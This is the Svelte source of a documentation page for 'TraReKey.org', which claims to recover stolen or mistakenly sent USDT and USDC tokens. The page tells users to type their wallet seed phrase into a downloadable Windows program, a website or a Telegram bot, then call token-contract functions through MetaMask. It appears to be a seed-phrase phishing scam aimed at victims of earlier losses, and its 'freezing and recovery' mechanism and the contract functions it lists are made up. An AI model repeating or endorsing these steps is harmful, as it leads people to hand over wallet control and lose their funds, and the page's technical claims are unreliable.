<script lang="ts">
	import { fade } from 'svelte/transition';

	import { _ } from 'svelte-i18n';
	import Contacts from '$lib/elements/Contacts.svelte';
	import {
		select_main_nav,
		brand,
		ETH_USDT,
		ETH_USDC,
		BASE_USDC,
		BNB_USDT,
		BNB_USDC
	} from '$lib/store.js';

	if ($select_main_nav != '/') {
		$select_main_nav = '/';
	}

	import { TableOfContents, tocCrawler } from '@skeletonlabs/skeleton';
	import Headero from '$lib/elements/HeaderOut.svelte';

	let video_01 = '/video/win.mp4';
	let video_02 = '/video/manual_01.mp4';
	let video_04 = '/video/manual_03.mp4';
	let video_05 = '/video/manual_04.mp4';
</script>

<svelte:head>
	<title>{$brand} | Docs. What is an Unlock Key?</title>
</svelte:head>

<Headero />

<div
	class=" max-[500px]:block max-w-screen-md p-5 font-sans bg-surface-100 text-black leading-tight"
>
	<img src="/logo.png" class="opacity-80 inline !w-12" alt="logo trarekey" />
	<div class="w-full text-center text-3xl font-bold">TraReKey.org</div>

	<div class="text-xl font-semibold mt-2">
		A secure solution for recovering USDT and USDC tokens in case of an erroneous transaction,
		theft, hacking, or fraudulent activities.
	</div>
	Supported networks: Ethereum, Base, BNB Smart Chain
	<div class=" text-left">
		<div class="w-full text-center mt-7">
			<img src="/USDT-USDC-tokens.png" class="opacity-80 inline !w-32" alt="USDT USDC" />
		</div>

		<div class="mt-3 px-3 text-base text-neutral-900 font-sans text-center">
			USDT (Tether) and USDC tokens feature a smart contract mechanism for freezing and recovering
			assets, supporting AML policies and compliance with legal regulations. This functionality
			enables freezing tokens in cases of suspicious activity or errors, enhancing security and
			control over blockchain assets.
		</div>

		<hr class="mt-3 !border-t-2 !border-primary-500" />

		<h2 class="h2 mt-5 text-2xl font-semibold max-[500px]:text-2xl" id="what-is-unlock-key">
			Freezing and Recovery Mechanism: <span class="text-error-500"> 5 Key Steps</span>
		</h2>

		<div class="px-3 text-sm text-neutral-900">
			<div class="mt-2 font-semibold text-xl max-[500px]:text-xl" id="what-is-unlock-key">
				1. Submitting a Request
			</div>

			<ul class="list-disc pl-5 pt-1">
				<li class="py-0">
					Users initiate the process via a specialized interface or directly through blockchain
					tools (e.g., web3 libraries, etherscan.io).
				</li>
				<li class="py-0">
					Required details: Transaction Hash (TX hash), HEX Key (Trarekey), and a signature from the
					affected wallet.
				</li>
			</ul>

			<div class="mt-2 font-semibold text-xl max-[500px]:text-xl" id="what-is-unlock-key">
				2. Initial Freezing
			</div>

			<ul class="list-disc pl-5 pt-1">
				<li class="py-0">
					Upon request, the smart contract immediately freezes the associated funds to prevent
					further movement.
				</li>
			</ul>

			<div class="mt-2 font-semibold text-xl max-[500px]:text-xl" id="what-is-unlock-key">
				3. AI-Driven Analysis
			</div>

			<ul class="list-disc pl-5 pt-1">
				<li class="py-0">
					An AI module evaluates transaction history, wallet behavior, and metadata for signs of
					fraud or suspicious activity.
				</li>
			</ul>

			<div class="mt-2 font-semibold text-xl max-[500px]:text-xl" id="what-is-unlock-key">
				4. Temporary Delay
			</div>

			<ul class="list-disc pl-5 pt-1">
				<li class="py-0">
					A 24-hour delay allows further evidence collection and external validation to prevent
					misuse.
				</li>
			</ul>

			<div class="mt-2 font-semibold text-xl max-[500px]:text-xl" id="what-is-unlock-key">
				5. Fund Recovery
			</div>

			<ul class="list-disc pl-5 pt-1">
				<li class="py-0">
					Once verified, the recovery process is completed, restoring the funds to the rightful
					owner.
				</li>
			</ul>
		</div>

		<hr class="mt-3 !border-t-2 !border-primary-500" />

		<div class="px-3 text-sm text-neutral-900">
			<div class="mt-5 font-semibold text-2xl max-[500px]:text-xl" id="what-is-unlock-key">
				What is Trarekey (HEX Key)?
			</div>
			<div class="pt-0">
				Trarekey is a unique identifier generated using a hash function derived from the user's seed
				phrase. It serves as a secure means of verifying authorization for operations in a smart
				contract. Trarekey is attached to requests sent to the smart contract to confirm that the
				operation is initiated by an authorized user, including:
			</div>

			<ul class="list-disc pl-5 pt-1">
				<li class="py-1"><strong>Freezing tokens </strong>in cases of suspicious activity.</li>
				<li class="py-1">
					<strong>Recovering funds </strong> from erroneous or fraudulent transactions.
				</li>
			</ul>

			<div class="mt-2 font-semibold text-xl max-[500px]:text-xl" id="what-is-unlock-key">
				Trarekey (HEX Key) Generation
			</div>
			<div class="pt-0">
				The most secure method is generating the Trarekey locally on the user’s device through a
				dedicated application, such as <a
					href="download/TraReKey_0.1.0_x64.exe"
					class="text-primary-500 font-bold"
				>
					TraReKey Generator (Windows)</a
				>, using a secure hashing algorithm.
				<br />Alternatively, Trarekey can be generated via a website or a
				<a href="https://t.me/TrarekeyBot" class="text-primary-500 font-bold" target="_blank"
					>Telegram bot</a
				>; however, this approach carries additional risks.
			</div>

			<div class="mt-2 font-semibold text-xl max-[500px]:text-xl" id="what-is-unlock-key">
				How Trarekey is Generated
			</div>
			<div class="pt-0">
				The HEX key is created from the user's seed phrase using a hash function, ensuring secure
				identity confirmation without exposing sensitive information. The process is as follows:
			</div>

			<ul class="list-decimal pl-5 pt-1">
				<li class="py-1">
					<strong>Blockchain and Token Selection: </strong>
					<br />The user selects the blockchain and the token (USDT/USDC) for which the recovery
					request will be submitted.
				</li>
				<li class="py-1">
					<strong>Seed Phrase Input: </strong>
					<br />The user inputs their seed phrase into the local application or alternative
					platform.
				</li>
				<li class="py-1">
					<strong>Hashing Algorithm Execution: </strong>
					<br /> A secure hashing algorithm generates a unique HEX key based on the seed phrase.
				</li>
			</ul>

			<div class="pt-0">
				The Trarekey key is used to sign requests, ensuring both security and authenticity, without
				the need to share confidential wallet information. This robust security design ensures that
				the Trarekey key maintains the highest level of trust and reliability in operations
				involving USDT and USDC tokens.
			</div>
		</div>

		<hr class="mt-3 !border-t-2 !border-primary-500" />

		<h2 class="mt-5 h2 text-xl text-primary-500" id="manual-enter">
			Links and functions for manual entry of the Trarekey
		</h2>

		<div class="p-2 w-fit text-sm text-neutral-900 mt-3 mb-3 border border-secondary-600">
			<table class="table-auto font-sans">
				<thead>
					<tr class=" border-b border-secondary-500 text-sm text-secondary-900">
						<th>Network & Token</th>
						<th>Function</th>
					</tr>
				</thead>
				<tbody>
					<tr class=" border-b border-secondary-500">
						<td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
							<a
								href="https://etherscan.io/address/{$ETH_USDT}#writeContract"
								class="hover:opacity-75"
								target="_blank"
							>
								USDT (Ethereum Mainnet)
								<img
									src="/icon-link.png"
									class="inline opacity-50 hover:opacity-100 !w-5"
									alt=""
								/></a
							>
						</td>
						<td class="text-xs p-1"
							>1. _verifyTxAndKey (0xb158845c)

							<br />2. _xReverseTransactionInit (0xf9b3951a)
						</td>
					</tr>

					<tr class=" border-b border-secondary-500">
						<td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
							<a
								href="https://etherscan.io/address/{$ETH_USDC}#writeContract"
								class="hover:opacity-75"
								target="_blank"
							>
								USDC (Ethereum Mainnet)
								<img
									src="/icon-link.png"
									class="inline opacity-50 hover:opacity-100 !w-5"
									alt=""
								/></a
							>
						</td>
						<td class="text-xs p-1"
							>1. _verifyTxAndKey (0xb158845c)

							<br />2. _xReverseTransactionInit (0xf9b3951a)
						</td>
					</tr>

					<tr class=" border-b border-secondary-500">
						<td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
							<a
								href="https://bscscan.com/address/{$BNB_USDT}#writeContract"
								class="hover:opacity-75"
								target="_blank"
							>
								USDT (BNB Smart Chain)
								<img
									src="/icon-link.png"
									class="inline opacity-50 hover:opacity-100 !w-5"
									alt=""
								/></a
							>
						</td>
						<td class="text-xs p-1"
							>1. _verifyTxAndKey (0xb158845c)

							<br />2. _xReverseTransactionInit (0xf9b3951a)
						</td>
					</tr>

					<tr class=" border-b border-secondary-500">
						<td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
							<a
								href="https://bscscan.com/address/{$BNB_USDC}#writeContract"
								class="hover:opacity-75"
								target="_blank"
							>
								USDC (BNB Smart Chain)
								<img
									src="/icon-link.png"
									class="inline opacity-50 hover:opacity-100 !w-5"
									alt=""
								/></a
							>
						</td>
						<td class="text-xs p-1"
							>1. _verifyTxAndKey (0xb158845c)

							<br />2. _xReverseTransactionInit (0xf9b3951a)
						</td>
					</tr>

					<tr class="  ">
						<td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
							<a
								href="https://basescan.org/address/{$BASE_USDC}#writeContract"
								class="hover:opacity-75"
								target="_blank"
							>
								USDC (Base Mainnet)
								<img
									src="/icon-link.png"
									class="inline opacity-50 hover:opacity-100 !w-5"
									alt=""
								/></a
							>
						</td>
						<td class="text-xs p-1"
							>1. _verifyTxAndKey (0xb158845c)

							<br />2. _xReverseTransactionInit (0xf9b3951a)
						</td>
					</tr>
				</tbody>
			</table>
		</div>

		<hr class="mt-10 !border-t-2 !border-primary-500" />

		<h2 class="pt-5 h2 text-xl max-[500px]:text-base text-secondary-900" id="via-metamask">
			Algorithm for Activating the Function via MetaMask
		</h2>

		<div class="mt-3 px-3 text-sm text-neutral-900">
			<ul class="list-decimal pl-5 pt-1">
				<div class="my-3">
					<video controls width="800">
						<source src={video_02} type="video/mp4" />
						Your browser does not support video.
					</video>
				</div>

				<li class="py-1">
					<strong class="text-base">Activating the Verification Function</strong><br />
				</li>

				<div class="my-3">
					<video controls width="800">
						<source src={video_05} type="video/mp4" />
						Your browser does not support video.
					</video>
				</div>

				<li class="py-1">
					<strong class="text-base"> Activating the Token Refund Function</strong><br />
				</li>

				<li class="py-1">
					<strong class="text-xl text-success-500"> Completion</strong><br />
					<strong class="text-base text-success-500">
						Once the transaction is completed, the token refund should occur immediately.
					</strong>
				</li>
			</ul>
		</div>

		<hr class="mt-3 !border-t-2 !border-primary-500" />
	</div>

	<br /><br /><br />
</div>

<Contacts />

<br /><br />
